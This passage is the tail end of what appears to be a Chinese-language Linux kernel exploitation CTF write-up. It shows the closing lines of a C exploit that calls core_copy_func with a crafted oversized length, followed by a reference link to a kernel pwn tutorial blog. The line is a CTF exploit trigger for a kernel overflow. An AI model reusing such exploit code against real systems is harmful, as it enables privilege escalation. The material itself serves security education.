
    core_copy_func(fd, (0xffffffffffff0000 | 0x100));
    return 0;
}
```

# 参考内容

[【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3's blog](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/)
